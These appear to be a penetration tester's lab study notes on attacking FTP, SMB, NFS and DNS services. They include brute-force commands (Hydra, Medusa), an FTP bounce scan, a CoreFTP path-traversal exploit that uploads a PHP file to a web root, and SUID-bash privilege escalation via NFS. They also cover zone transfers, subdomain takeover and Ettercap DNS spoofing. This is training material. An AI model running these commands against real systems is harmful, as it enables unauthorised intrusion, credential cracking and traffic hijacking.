	[+] With vsFTPd, the optional(http://vsftpd.beasts.org/vsftpd_conf.html)settings that can be added to the configuration file for the anonymous login look like this.Dangerous settings!!
	Setting				Description
	anonymous_enable=YES		Allowing anonymous login?
	anon_upload_enable=YES		Allowing anonymous to upload files?
	anon_mkdir_write_enable=YES	Allowing anonymous to create new directories?
	no_anon_password=YES		Do not ask anonymous for password?
	anon_root=/home/username/ftp	Directory for anonymous.
	write_enable=YES		Allow the usage of FTP commands: STOR, DELE, RNFR, RNTO, MKD, RMD, APPE, and SITE?

* After connecting
	status
	debug
	trace
* Other settings
	Setting	Description	Setting	Description
	dirmessage_enable=YES	Show a message when they first enter a new directory?	
	chown_uploads=YES	Change ownership of anonymously uploaded files?	
	chown_username=username	User who is given ownership of anonymously uploaded files.
	local_enable=YES	Enable local users to login?
	chroot_local_user=YES	Place local users into their home directory?
	chroot_list_enable=YES	Use a list of local users that will be placed in their home directory?
	hide_ids=YES		All user and group information in directory listings will be displayed as "ftp".
	ls_recurse_enable=YES	Allows the use of recurse listings.
	
	> If the hide_ids=YES setting is present, the UID and GUID representation of the service will be overwritten, making it more difficult for us to identify with which rights these files are written and uploaded. This setting is a security feature to prevent local usernames from being revealed. With the usernames, we could attack the services like FTP and SSH and many others with a brute-force attack in theory. However, in reality, fail2ban solutions are now a standard implementation of any infrastructure that logs the IP address and blocks all access to the infrastructure after a certain number of failed login attempts.

	> Another helpful setting we can use for our purposes is the ls_recurse_enable=YES. This is often set on the vsFTPd server to have a better overview of the FTP directory structure, as it allows us to see all the visible content at once.
		ls -R
* Downloading files from such an FTP server is one of the main features, as well as uploading files created by us. This allows us, for example, to use LFI vulnerabilities to make the host execute system commands. Apart from the files, we can view, download and inspect. Attacks are also possible with the FTP logs, leading to Remote Command Execution (RCE). This applies to the FTP services and all those we can detect during our enumeration phase.
	get Important\ Notes.txt ==> One file
	wget -m --no-passive ftp://anonymous:anonymous@10.129.14.136 ==> Download all available files
* Next, we can check if we have the permissions to upload files to the FTP server. Especially with web servers, it is common that files are synchronized, and the developers have quick access to the files. FTP is often used for this purpose, and most of the time, configuration errors are found on servers that the administrators think are not discoverable. The attitude that internal network components cannot be accessed from the outside means that the hardening of internal systems is often neglected and leads to misconfigurations. The ability to upload files to the FTP server connected to a web server increases the likelihood of gaining direct access to the webserver and even a reverse shell that allows us to execute internal system commands and perhaps even escalate our privileges.
	put testupload.txt

* Nmap
	> Update this databse of NSE scripts
		sudo nmap --script-updatedb
	> Find nmap FTP scripts
		find / -type f -name ftp* 2>/dev/null | grep scripts
		ftp-anon ==> anonymous access
		ftp-syst ==> STAT command
	--script-trace ==> This lets us see what commands Nmap sends, what ports are used, and what responses we receive from the scanned server
    	nmap 192.168.188.128 --script ftp-brute --script-args userdb=/root/users -p 21
    	anonymous login
    		nmap 192.20.26.3 -p21 --script ftp-anon
* Service interaction
	nc -nv 10.129.14.136 21
	telnet 10.129.14.136 21
	openssl s_client -connect 10.129.14.136:21 -starttls ftp
		The SSL certificate allows us to recognize the hostname, for example, and in most cases also an email address for the organization or company. In addition, if the company has several locations worldwide, certificates can also be created for specific locations, which can also be identified using the SSL certificate.
* FTP
	ftp -p 10.129.42.254 
	ftp 192.168.188.128
* Medusa => (https://github.com/jmk-foofus/medusa)
    > Note: Although we may find services vulnerable to brute force, most applications today prevent these types of attacks. A more effective method is Password Spraying.
    m1l0js@htb[/htb]$ medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M ftp
* FTP Bounce Attack
    > An FTP bounce attack is a network attack that uses FTP servers to deliver outbound traffic to another device on the network. The attacker uses a PORT command to trick the FTP connection into running commands and getting information from a device other than the intended server.
    > Consider we are targetting an FTP Server FTP_DMZ exposed to the internet. Another device within the same network, Internal_DMZ, is not exposed to the internet. We can use the connection to the FTP_DMZ server to scan Internal_DMZ using the FTP Bounce attack and obtain information about the server's open ports. Then, we can use that information as part of our attack against the infrastructure. => (https://www.geeksforgeeks.org/what-is-ftp-bounce-attack/)
    > Prevention measures 
        1. Modern FTP servers by default take care of such attacks. FTP Servers today only accept PORT commands that initiate a connection from the originating host. It denies any other PORT commands that may try to connect to different device IPs. An individual can check for this default feature in their systems.
        2. Additionally one can configure their firewall to deny requests on port 20. Port 20 is the default port for Passive FTP and is considered very insecure
    > The Nmap -b flag can be used to perform an FTP bounce attack:
        m1l0js@htb[/htb]$ nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2
        Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-27 04:55 EDT
        Resolved FTP bounce attack proxy to 10.10.110.213 (10.10.110.213).
        Attempting connection to ftp://anonymous:password@10.10.110.213:21

        Connected:220 (vsFTPd 3.0.3)
        Login credentials accepted by FTP server!
        Initiating Bounce Scan at 04:55
        FTP command misalignment detected ... correcting.
        Completed Bounce Scan at 04:55, 0.54s elapsed (1 total ports)
        Nmap scan report for 172.17.0.2
        Host is up.
        
        PORT   STATE  SERVICE
        80/tcp open http
    > It takes an argument of the form username:password@server:port.  Server is the name or IP address of a vulnerable FTP server. As with a normal URL, you may omit username:password, in which case anonymous login credentials (user: anonymous password:-wwwuser@) are used. The port number (and preceding colon) may be omitted as well, in which case the default FTP port (21) on server is used.

* Hydra
    	brute force with
    	  	hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.168.188.128 ftp

* Latest FTP vulnerabilities
    > In this case, we will discuss the CoreFTP before build 727 vulnerability assigned CVE-2022-22836. This vulnerability is for an FTP service that does not correctly process the HTTP PUT request and leads to an authenticated directory/path traversal, and arbitrary file write vulnerability. This vulnerability allows us to write files outside the directory to which the service has access.
    + The Concept of the Attack
        > This FTP service uses an HTTP POST request to upload files. However, the CoreFTP service allows an HTTP PUT request, which we can use to write content to files. Let's have a look at the attack based on our concept. The exploit(https://www.exploit-db.com/exploits/50652) for this attack is relatively straightforward, based on a single cURL command.
            m1l0js@htb[/htb]$ curl -k -X PUT -H "Host: <IP>" --basic -u <username>:<password> --data-binary "PoC." --path-as-is https://<IP>/../../../../../../whoops
        //Ejemplo en caso practico
            └─$ curl -k -X PUT  -H "Host: 10.129.148.106" --basic -u fiona:987654321  --data-binary "@malisima.php" --path-as-is https://10.129.148.106/../xampp/htdocs/vamoaprobar.php


####SAMBA
* SAMBA utilizes username and password authentication in order to obtain access to the server or a network share
	hydra -l admin -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.93.66.3 -t 4 smb
####NFS
* Network File System (NFS) is a network file system developed by Sun Microsystems and has the same purpose as SMB. Its purpose is to access file systems over a network as if they were local. However, it uses an entirely different protocol. NFS is used between Linux and Unix systems. This means that NFS clients cannot communicate directly with SMB servers. NFS is an Internet standard that governs the procedures in a distributed file system. While NFS protocol version 3.0 (NFSv3), which has been in use for many years, authenticates the client computer, this changes with NFSv4. Here, as with the Windows SMB protocol, the user must authenticate.
* Versions
	Version	Features
	NFSv2	It is older but is supported by many systems and was initially operated entirely over UDP.
	NFSv3	It has more features, including variable file size and better error reporting, but is not fully compatible with NFSv2 clients.
	NFSv4	It includes Kerberos, works through firewalls and on the Internet, no longer requires portmappers, supports ACLs, applies state-based operations, and provides performance improvements and high security. It is also the first version to have a stateful protocol.
* NFS version 4.1 (RFC 8881) aims to provide protocol support to leverage cluster server deployments, including the ability to provide scalable parallel access to files distributed across multiple servers (pNFS extension). In addition, NFSv4.1 includes a session trunking mechanism, also known as NFS multipathing. A significant advantage of NFSv4 over its predecessors is that only one UDP or TCP port 2049 is used to run the service, which simplifies the use of the protocol across firewalls.

* NFS is based on the Open Network Computing Remote Procedure Call (ONC-RPC/SUN-RPC) protocol exposed on TCP and UDP ports 111, which uses External Data Representation (XDR) for the system-independent exchange of data. The NFS protocol has no mechanism for authentication or authorization. Instead, authentication is completely shifted to the RPC protocol's options. The authorization is taken from the available information of the file system where the server is responsible for translating the user information supplied by the client to that of the file system and converting the corresponding authorization information as correctly as possible into the syntax required by UNIX.

* The most common authentication is via UNIX UID/GID and group memberships, which is why this syntax is most likely to be applied to the NFS protocol. One problem is that the client and server do not necessarily have to have the same mappings of UID/GID to users and groups, and the server does not need to do anything further. No further checks can be made on the part of the server. This is why NFS should only be used with this authentication method in trusted networks.

[+] Default configuration
	> NFS is not difficult to configure because there are not as many options as FTP or SMB have. The /etc/exports file contains a table of physical filesystems on an NFS server accessible by the clients. The NFS Exports Table shows which options it accepts and thus indicates which options are available to us ==> http://manpages.ubuntu.com/manpages/trusty/man5/exports.5.html

		cat /etc/exports
* Additional options
	> The default exports file also contains some examples of configuring NFS shares. First, the folder is specified and made available to others, and then the rights they will have on this NFS share are connected to a host or a subnet. Finally, additional options can be added to the hosts or subnets

		Option			Description
		rw			Read and write permissions.
		ro			Read only permissions.
		sync			Synchronous data transfer. (A bit slower)
		async			Asynchronous data transfer. (A bit faster)
		secure			Ports above 1024 will not be used.
		insecure		Ports above 1024 will be used.
		no_subtree_check	This option disables the checking of subdirectory trees.
		root_squash		Assigns all permissions to files of root UID/GID 0 to the UID/GID of anonymous, which prevents root from accessing files on an NFS mount.
	[+] Example
		echo '/mnt/nfs  10.129.14.0/24(sync,no_subtree_check)' >> /etc/exports
		systemctl restart nfs-kernel-server
		exportfs
[+] Dangerous settings
	Option		Description
	rw		Read and write permissions.
	insecure	Ports above 1024 will be used ==> This is dangerous because users can use ports above 1024. The first 1024 ports can only be used by root. This prevents the fact that no users can use sockets above port 1024 for the NFS service and interact with it.
	nohide		If another file system was mounted below an exported directory, this directory is exported by its own exports entry.
	no_root_squash	All files created by root are kept with the UID/GID 0.
[+] Nmap
	sudo nmap 10.129.14.128 -p111,2049 -sV -sC
	sudo nmap --script nfs* 10.129.14.128 -sV -p111,2049

* Once we have discovered such an NFS service, we can mount it on our local machine. For this, we can create a new empty folder to which the NFS share will be mounted. Once mounted, we can navigate it and view the contents just like our local system. 
	> Show availabale NFS shares
		showmount -e 10.129.14.128
	> Mounting NFS share
		mkdir target-NFS
		mount -t nfs 10.129.14.128:/ ./target-NFS/ -o nolock
		cd target-NFS
		tree .
* List contents with usernames & group names
	ls -l mnt/nfs/
	ls -n mnt/nfs/
* It is important to note that if the root_squash option is set, we cannot edit the backup.sh[a example file] file even as root.

* Privesc
	> We can also use NFS for further escalation. For example, if we have access to the system via SSH and want to read files from another folder that a specific user can read, we would need to upload a shell to the NFS share that has the SUID of that user and then run the shell via the SSH user.

* Unmounting
	cd ..
	umount ./target-NFS

* Other commands
  	sudo apt install nfs-common
  	sudo mount -t nfs IP:share /tmp/mount/ -nolock
  	/usr/sbin/showmount -e 10.10.236.98: To list the NFS shares
 	./bash -p". The -p persists the permissions, so that it can run as root with SUID- as otherwise bash will sometimes drop the permissions.
 	sudo chown root /home/andres/Downloads/bash
 	sudo chmod +s

####DNS
[+] URLs
  > (https://en.wikipedia.org/wiki/List_of_ISO_3166_country_codes)
  > (https://www.iana.org/assignments/dns-parameters/dns-parameters.xhtml#dns-parameters-4)
  > (https://who.is)
  > (https://archive.org/web/)
  > (http://www.hosterstats.com/)
  > (https://intodns.com/)
  > (https://www.domaintools.com/)
  > (https://www.nslookup.io/)
  > (http://mxtoolbox.com/)
  > (https://toolbox.googleapps.com/apps/dig/)

[+] Types of DNS servers
	> DNS Root Server	==> The root servers of the DNS are responsible for the top-level domains (TLD). As the last instance, they are only requested if the name server does not respond. Thus, a root server is a central interface between users and content on the Internet, as it links domain and IP address. The Internet Corporation for Assigned Names and Numbers (ICANN) coordinates the work of the root name servers. There are 13 such root servers around the globe.
    * TLDs nameservers, the Top-Level Domains, might be compared to a single shelf of books in a library. The last portion of a hostname is hosted by this nameserver, which is the following stage in the search for a specific IP address (in www.facebook.com, the TLD server is com). Most TLDs have been delegated to individual country managers, who are issued codes from the ISO-3166-1 table. These are known as country-code Top-Level Domains or ccTLDs managed by a United Nations agency.
    * There are also a small number of "generic" Top Level Domains (gTLDs) that are not associated with a specific country or region. TLD managers have been granted responsibility for procedures and policies for the assignment of Second Level Domain Names (SLDs) and lower level hierarchies of names, according to the policy advice specified in ISO-3166-1.
    *A manager for each nation organizes country code domains. These managers provide a public service on behalf of the Internet community. Resource Records are the results of DNS queries and have the following structure:
	
      Resource Record:          A domain name, usually a fully qualified domain name, is the first part of a Resource Record. 
                                If you don't use a fully qualified domain name, the zone's name where the record is located will be appended to the end of the name.
      TTL:	                    In seconds, the Time-To-Live (TTL) defaults to the minimum value specified in the SOA record.
      Record Class	            Internet, Hesiod, or Chaos
      Start Of Authority (SOA):	It should be first in a zone file because it indicates the start of a zone. Each zone can only have one SOA record, and additionally, 
                                it contains the zone's values, such as a serial number and multiple expiration timeouts.
      Name Servers (NS):        The distributed database is bound together by NS Records. They are in charge of a zone's authoritative name server and the 
                                authority for a child zone to a name server.
      IPv4 Addresses (A)	      The A record is only a mapping between a hostname and an IP address. 'Forward' zones are those with A records.
      Pointer (PTR)	            The PTR record is a mapping between an IP address and a hostname. 'Reverse' zones are those that have PTR records.
      Canonical Name (CNAME)	  An alias hostname is mapped to an A record hostname using the CNAME record.
      Mail Exchange (MX)	      The MX record identifies a host that will accept emails for a specific host. A priority value has been assigned to the specified host. 
                                Multiple MX records can exist on the same host, and a prioritized list is made consisting of the records for a specific host.




	> Authoritative Nameserver ==> Authoritative name servers hold authority for a particular zone. They only answer queries from their area of responsibility, and their information is binding. If an authoritative name server cannot answer a client's query, the root name server takes over at that point.
	> Non-authoritative Nameserver ==> Non-authoritative name servers are not responsible for a particular DNS zone. Instead, they collect information on specific DNS zones themselves, which is done using recursive or iterative DNS querying.
	> Caching DNS Server ==> Caching DNS servers cache information from other name servers for a specified period. The authoritative name server determines the duration of this storage.
	> Forwarding Server ==>	Forwarding servers perform only one function: they forward DNS queries to another DNS server.
	> Resolver ==> Resolvers are not authoritative DNS servers but perform name resolution locally in the computer or router.
* DNS is mainly unencrypted. Devices on the local WLAN and Internet providers can therefore hack in and spy on DNS queries. Since this poses a privacy risk, there are now some solutions for DNS encryption. By default, IT security professionals apply DNS over TLS (DoT) or DNS over HTTPS (DoH) here. In addition, the network protocol NSCrypt also encrypts the traffic between the computer and the name server.
* However, the DNS does not only link computer names and IP addresses. It also stores and outputs additional information about the services associated with a domain. A DNS query can therefore also be used, for example, to determine which computer serves as the e-mail server for the domain in question or what the domain's name servers are called.

[+] Levels
	TLD ==> net. org. com. dev. io.
	Second level domain ==> inlanefreight.com
	Sub-domains ==> dev.inlanefreight.com  www.inlanefreight.com mail.inlanefreight.com
	Hosts ==> WS01.dev.inlanefreight.com

[+] Some DNS records
        A     - Resolves a hostname or domain to an IPv4 address
        AAAA  - Resolves a hostname or domain to an IPv6 address
        NS    - Reference to the domains nameserver. These kinds of records show which name servers are used to resolve the FQDN to IP addresses. Most hosting providers use their own name servers, making it easier to identify the hosting provider.
        MX    - Resolves a domain to a mail server. The mail server records show us which mail server is responsible for managing the emails for the company
        CNAME - Used for domain aliases. If the domain www.hackthebox.eu should point to the same IP, and we create an A record for one and a CNAME record for the other.
        PTR   - The PTR record works the other way around (reverse lookup). It converts IP addresses into valid domain names.
        TXT   - Text record. This type of record often contains verification keys for different third-party providers and other security aspects of DNS, such as SPF, DMARC, and DKIM, which are responsible for verifying and confirming the origin of the emails sent
        HINFO - Host information
        SOA   - Domain authority. Provides information about the corresponding DNS zone and email address of the administrative contact.
		The SOA record is located in a domain's zone file and specifies who is responsible for the operation of the domain and how DNS information for the domain is managed.
			dig soa inlanefreight.com
		The dot (.) is replaced by an at sign (@) in the email address. In this example, the email address of the administrator is awsdns-hostmaster@amazon.com.
        SRV   - Service records

[+] Whois, nslookup, host & DIG
  dig facebook.com @1.1.1.1
    ANSWER SECTION:
    facebook.com.           169     IN      A       31.13.92.36
      # The entry may be held in the cache for 169 seconds before the information must be requested again. The class is understandably the Internet (IN).
  A Records for a Subdomain
    export TARGET=www.facebook.com     
      nslookup -query=A $TARGET 
    dig a www.facebook.com @1.1.1.1
  PTR records for an IP address
    nslookup -query=PTR 31.13.92.36
    dig -x 31.13.92.36 @1.1.1.1
  ANY existing records
    export TARGET="google.com"
      nslookup -query=ANY $TARGET
    dig any google.com @8.8.8.8
    > The more recent RFC8482 specified that ANY DNS requests be abolished. Therefore, we may not receive a response to our ANY request from the DNS server or get a reference to the said RFC8482.
  TXT records
    export TARGET="facebook.com"
      nslookup -query=TXT $TARGET
    dig txt facebook.com @1.1.1.1 
  MX records
    export TARGET="facebook.com"
      nslookup -query=MX $TARGET
    dig mx facebook.com @1.1.1.1
	All information with host 	host -a tryhackme.com
	All information with dig 	dig +nocmd google.com any +noall +answer
	Trace option			dig google.com +trace

  > So far, we have gathered A, NS, MX, and CNAME records with the nslookup and dig commands. Organizations are given IP addresses on the Internet, but they aren't always their owners. They might rely on ISPs and hosting provides that lease smaller netblocks to them. We can combine some of the results gathered via nslookup with the whois database to determine if our target organization uses hosting providers. This combination looks like the following example:

[+] Default configuration
	> There are many different configuration types for DNS. Therefore, we will only discuss the most important ones to illustrate better the functional principle from an administrative point of view. All DNS servers work with three different types of configuration files:
		Local DNS configuration files
    		Zone files
    		Reverse name resolution files

	> The DNS server Bind9 is very often used on Linux-based distributions. Its local configuration file (named.conf) is roughly divided into two sections, firstly the options section for general settings and secondly the zone entries for the individual domains. The local configuration files are usually:
    		named.conf.local
    		named.conf.options
    		named.conf.log
	>  The configuration file named.conf is divided into several options that control the behavior of the name server. A distinction is made between global options and zone options. Global options are general and affect all zones. A zone option only affects the zone to which it is assigned. Options not listed in named.conf have default values. If an option is both global and zone-specific, then the zone option takes precedence

		cat /etc/bind/named.conf.local

	> In this file, we can define the different zones. These zones are divided into individual files, which in most cases are mainly intended for one domain only. Exceptions are ISP and public DNS servers. In addition, many different options extend or reduce the functionality. We can look these up on the documentation of Bind9.

	> A zone file is a text file that describes a DNS zone with the BIND file format. In other words it is a point of delegation in the DNS tree. The BIND file format is the industry-preferred zone file format and is now well established in DNS server software. A zone file describes a zone completely. There must be precisely one SOA record and at least one NS record. The SOA resource record is usually located at the beginning of a zone file. The main goal of these global rules is to improve the readability of zone files. A syntax error usually results in the entire zone file being considered unusable. The name server behaves similarly as if this zone did not exist. It responds to DNS queries with a SERVFAIL error message.

	> In short, here, all forward records are entered according to the BIND format. This allows the DNS server to identify which domain, hostname, and role the IP addresses belong to. In simple terms, this is the phone book where the DNS server looks up the addresses for the domains it is searching for.
		
		cat /etc/bind/db.domain.com
	> For the IP address to be resolved from the Fully Qualified Domain Name (FQDN), the DNS server must have a reverse lookup file. In this file, the computer name (FQDN) is assigned to the last octet of an IP address, which corresponds to the respective host, using a PTR record. The PTR records are responsible for the reverse translation of IP addresses into names
		Reverse name resolution zone files
			cat /etc/bind/db.10.129.14

    


[+] Dangerous Settings

	> There are many ways in which a DNS server can be attacked. For example, a list of vulnerabilities targeting the BIND9 server can be found at CVEdetails(https://www.cvedetails.com/product/144/ISC-Bind.html?vendor_id=64). In addition, SecurityTrails provides a short list of the most popular attacks on DNS servers ==> https://securitytrails.com/blog/most-popular-types-dns-attacks

	> Some of the settings we can see below lead to these vulnerabilities, among others. Because DNS can get very complicated and it is very easy for errors to creep into this service, forcing an administrator to work around the problem until they find an exact solution. This often leads to elements being released so that parts of the infrastructure function as planned and desired. In such cases, functionality has a higher priority than security, which leads to misconfigurations and vulnerabilities.

	Option		      Description
	allow-query	    Defines which hosts are allowed to send requests to the DNS server.
	allow-recursion	Defines which hosts are allowed to send recursive requests to the DNS server.
	allow-transfer	Defines which hosts are allowed to receive zone transfers from the DNS server.
	zone-statistics	Collects statistical data of zones.
[+] Footprinting the Service

	> The footprinting at DNS servers is done as a result of the requests we send. So, first of all, the DNS server can be queried as to which other name servers are known. We do this using the NS record and the specification of the DNS server we want to query using the @ character. This is because if there are other DNS servers, we can also use them and query the records. However, other DNS servers may be configured differently and, in addition, may be permanent for other zones.
		dig ns inlanefreight.htb @10.10.14.15
	> Sometimes it is also possible to query a DNS server's version using a class CHAOS query and type TXT. However, this entry must exist on the DNS server. For this, we could use the following command:
		dig CH TXT version.bind 10.129.120.54
	> We can use the option ANY to view all available records. This will cause the server to show us all available entries that it is willing to disclose. It is important to note that not all entries from the zones will be shown.
		
		dig any inlanefreight.htb @10.129.120.54

[+] Zone transfer
	> Zone transfer refers to the transfer of zones to another server in DNS, which generally happens over TCP port 53. This procedure is abbreviated Asynchronous Full Transfer Zone (AXFR). Since a DNS failure usually has severe consequences for a company, the zone file is almost invariably kept identical on several name servers. When changes are made, it must be ensured that all servers have the same data. Synchronization between the servers involved is realized by zone transfer. Using a secret key rndc-key, which we have seen initially in the default configuration, the servers make sure that they communicate with their own master or slave. Zone transfer involves the mere transfer of files or records and the detection of discrepancies in the data sets of the servers involved.

	> The original data of a zone is located on a DNS server, which is called the primary name server for this zone. However, to increase the reliability, realize a simple load distribution, or protect the primary from attacks, one or more additional servers are installed in practice in almost all cases, which are called secondary name servers for this zone. For some Top-Level Domains (TLDs), making zone files for the Second Level Domains accessible on at least two servers is mandatory.

	> DNS entries are generally only created, modified, or deleted on the primary. This can be done by manually editing the relevant zone file or automatically by a dynamic update from a database. A DNS server that serves as a direct source for synchronizing a zone file is called a master. A DNS server that obtains zone data from a master is called a slave. A primary is always a master, while a secondary can be both a slave and a master.

	> The slave fetches the SOA record of the relevant zone from the master at certain intervals, the so-called refresh time, usually one hour, and compares the serial numbers. If the serial number of the SOA record of the master is greater than that of the slave, the data sets no longer match.

		dig axfr inlanefreight.htb @10.129.14.128
	
	> If the administrator used a subnet for the allow-transfer option for testing purposes or as a workaround solution or set it to any, everyone would query the entire zone file at the DNS server. In addition, other zones can be queried, which may even show internal IP addresses and hostnames
		dig axfr internal.inlanefreight.htb @10.129.14.128
	
	> The individual A records with the hostnames can also be found out with the help of a brute-force attack. To do this, we need a list of possible hostnames, which we use to send the requests in order. Such lists are provided, for example, by SecLists(https://github.com/danielmiessler/SecLists/blob/master/Discovery/DNS/subdomains-top1million-5000.txt). 
		+ An option would be to execute a for-loop in Bash that lists these entries and sends the corresponding query to the desired DNS server.
			for sub in $(cat /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-110000.txt);do dig $sub.inlanefreight.htb @10.129.14.128 | grep -v ';\|SOA' | sed -r '/^\s*$/d' | grep $sub | tee -a subdomains.txt;done
      for eachitem in $(cat finalresults); do dig axfr $eachitem @10.129.206.107 | grep -v ';\|SOA' | sed -r '/^\s*$/d' |tee -a example;done #Another Way
		+ dnsenum
			dnsenum --dnsserver 10.129.14.128 --enum -p 0 -s 0 -o subdomains.txt -f /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-110000.txt inlanefreight.htb
            dnsenum --dnsserver 10.129.35.61  --enum -p 0 -s 0 -o les.txt -f /usr/share/seclists/Discovery/DNS/fierce-hostlist.txt dev.inlanefreight.htb --threads 90
        + fierce (https://github.com/mschwager/fierce)
            m1l0js@htb[/htb]# fierce --domain zonetransfer.me
        
[+] Virtual Hosts
  > A virtual host (vHost) is a feature that allows several websites to be hosted on a single server. This is an excellent solution if you have many websites and don't want to go through the time-consuming (and expensive) process of setting up a new web server for each one. Imagine having to set up a different webserver for a mobile and desktop version of the same page. There are two ways to configure virtual hosts:
    IP-based virtual hosting
    Name-based virtual hosting

  * IP-based Virtual Hosting
    > For this type, a host can have multiple network interfaces. Multiple IP addresses, or interface aliases, can be configured on each network interface of a host. The servers or virtual servers running on the host can bind to one or more IP addresses. This means that different servers can be addressed under different IP addresses on this host. From the client's point of view, the servers are independent of each other.

  * Name-based Virtual Hosting
    > The distinction for which domain the service was requested is made at the application level. For example, several domain names, such as admin.inlanefreight.htb and backup.inlanefreight.htb, can refer to the same IP. Internally on the server, these are separated and distinguished using different folders. Using this example, on a Linux server, the vHost admin.inlanefreight.htb could point to the folder /var/www/admin. For backup.inlanefreight.htb the folder name would then be adapted and could look something like /var/www/backup.
    > During our subdomain discovering activities, we have seen some subdomains having the same IP address that can either be virtual hosts or, in some cases, different servers sitting behind a proxy.

  > Imagine we have identified a web server at 192.168.10.10 during an internal pentest, and it shows a default website using the following command. Are there any virtual hosts present?
    curl -s http://192.168.10.10 #Default nginx page. Nothing interesting 
  > Let's make a cURL request sending a domain previously identified during the information gathering in the HOST header. We can do that like so:
    curl -s http://192.168.10.10 -H "Host: randomtarget.com" #Yeah
  > Now we can automate this by using a dictionary file of possible vhost names (such as /opt/useful/SecLists/Discovery/DNS/namelist.txt on the Pwnbox) and examining the Content-Length header to look for any differences.
    cat ./vhosts | while read vhost;do echo "\n********\nFUZZING: ${vhost}\n********";curl -s -I http://192.168.10.10 -H "HOST: ${vhost}.randomtarget.com" | grep "Content-Length: ";done
  > We have successfully identified a virtual host called dev-admin, which we can access using a cURL request.
    curl -s http://192.168.10.10 -H "Host: dev-admin.randomtarget.com"
    ➜  testing curl -s http://10.129.196.198 -H "Host: dmz.inlanefreight.htb"  | grep -i htb| tr -d '\t' | xclip -sel clip #Another way


  * Automating virtual hosts discovery 
    > We can use this manual approach for a small list of virtual hosts, but it will not be feasible if we have an extensive list. Using ffuf, we can speed up the process and filter based on parameters present in the response.
    > We can match or filter responses based on different options. The web server responds with a default and static website every time we issue an invalid virtual host in the HOST header. We can use the filter by size -fs option to discard the default response as it will always have the same size.
      ffuf -w ./vhosts -u http://192.168.10.10 -H "HOST: FUZZ.randomtarget.com" -fs 612
        -w: Path to our wordlist
        -u: URL we want to fuzz
        -H "HOST: FUZZ.randomtarget.com": This is the HOST Header, and the word FUZZ will be used as the fuzzing point.
        -fs 612: Filter responses with a size of 612, default response size in this case.

[+] Domain Takeovers & Subdomain Enumeration
    > Domain takeover is registering a non-existent domain name to gain control over another domain. If attackers find an expired domain, they can claim that domain to perform further attacks such as hosting malicious content on a website or sending a phishing email leveraging the claimed domain.
    > Domain takeover is also possible with subdomains called subdomain takeover. A DNS's canonical name (CNAME) record is used to map different domains to a parent domain. Many organizations use third-party services like AWS, GitHub, Akamai, Fastly, and other content delivery networks (CDNs) to host their content. In this case, they usually create a subdomain and make it point to those services. For example,
    > DIG - AXFR Zone Transfer
        sub.target.com.   60   IN   CNAME   anotherdomain.com
    > The domain name (e.g., sub.target.com) uses a CNAME record to another domain (e.g., anotherdomain.com). Suppose the anotherdomain.com expires and is available for anyone to claim the domain since the target.com's DNS server has the CNAME record. In that case, anyone who registers anotherdomain.com will have complete control over sub.target.com until the DNS record is updated.

[+] Subdomain Enumeration
    > Before performing a subdomain takeover, we should enumerate subdomains for a target domain using tools like Subfinder. This tool can scrape subdomains from open sources like DNSdumpster. Other tools like Sublist3r can also be used to brute-force subdomains by supplying a pre-generated wordlist:
        m1l0js@htb[/htb]# ./subfinder -d inlanefreight.com -v
    > An excellent alternative is a tool called Subbrute(https://github.com/TheRook/subbrute). This tool allows us to use self-defined resolvers and perform pure DNS brute-forcing attacks during internal penetration tests on hosts that do not have Internet access.
        m1l0js@htb[/htb]$ git clone https://github.com/TheRook/subbrute.git >> /dev/null 2>&1
        m1l0js@htb[/htb]$ cd subbrute
        m1l0js@htb[/htb]$ echo "ns1.inlanefreight.com" > ./resolvers.txt
        m1l0js@htb[/htb]$ ./subbrute inlanefreight.com -s ./names.txt -r ./resolvers.txt
    > Sometimes internal physical configurations are poorly secured, which we can exploit to upload our tools from a USB stick. Another scenario would be that we have reached an internal host through pivoting and want to work from there. Of course, there are other alternatives, but it does not hurt to know alternative ways and possibilities.
    > The tool has found four subdomains associated with inlanefreight.com. Using the nslookup or host command, we can enumerate the CNAME records for those subdomains.
    > Subbrute
        m1l0js@htb[/htb]# host support.inlanefreight.com
        support.inlanefreight.com is an alias for inlanefreight.s3.amazonaws.com
    > The support subdomain has an alias record pointing to an AWS S3 bucket. However, the URL https://support.inlanefreight.com shows a NoSuchBucket error indicating that the subdomain is potentially vulnerable to a subdomain takeover. Now, we can take over the subdomain by creating an AWS S3 bucket with the same subdomain name.
    > The can-i-take-over-xyz(https://github.com/EdOverflow/can-i-take-over-xyz) repository is also an excellent reference for a subdomain takeover vulnerability. It shows whether the target services are vulnerable to a subdomain takeover and provides guidelines on assessing the vulnerability.
    > Other URLs
        - https://github.com/projectdiscovery/subfinder
        - https://dnsdumpster.com/
        - https://github.com/aboul3la/Sublist3r

[+] DNS Spoofing
    > DNS spoofing is also referred to as DNS Cache Poisoning. This attack involves alerting legitimate DNS records with false information so that they can be used to redirect online traffic to a fraudulent website. Example attack paths for the DNS Cache Poisoning are as follows:
    >     An attacker could intercept the communication between a user and a DNS server to route the user to a fraudulent destination instead of a legitimate one by performing a Man-in-the-Middle (MITM) attack.
    >     Exploiting a vulnerability found in a DNS server could yield control over the server by an attacker to modify the DNS records.
    > Local DNS Cache Poisoning
    > From a local network perspective, an attacker can also perform DNS Cache Poisoning using MITM tools like Ettercap or Bettercap(https://www.cyberpunk.rs/bettercap-usage-examples-overview-custom-setup-caplets).
    > To exploit the DNS cache poisoning via Ettercap, we should first edit the /etc/ettercap/etter.dns file to map the target domain name (e.g., inlanefreight.com) that they want to spoof and the attacker's IP address (e.g., 192.168.225.110) that they want to redirect a user to:
        m1l0js@htb[/htb]# cat /etc/ettercap/etter.dns
        inlanefreight.com      A   192.168.225.110
        *.inlanefreight.com    A   192.168.225.110
    > Next, start the Ettercap tool and scan for live hosts within the network by navigating to Hosts > Scan for Hosts. Once completed, add the target IP address (e.g., 192.168.152.129) to Target1 and add a default gateway IP (e.g., 192.168.152.2) to Target2.
    > Activate dns_spoof attack by navigating to Plugins > Manage Plugins. This sends the target machine with fake DNS responses that will resolve inlanefreight.com to IP address 192.168.225.110:
